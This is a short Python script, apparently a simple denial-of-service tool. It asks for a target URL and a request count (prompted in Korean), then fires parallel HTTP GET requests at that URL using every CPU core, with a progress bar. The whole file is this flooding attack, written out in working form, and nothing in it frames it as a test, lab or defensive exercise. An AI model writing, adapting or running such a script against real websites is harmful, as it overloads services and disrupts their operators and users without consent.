import multiprocessing
import parmap
import requests


def dos(n, url):
    requests.get(url)


if __name__ == '__main__':
    target = input('URL: ')

    targetCount = int(input('횟수: '))

    parmap.map(dos, range(targetCount), target, pm_pbar=True, pm_processes=multiprocessing.cpu_count())
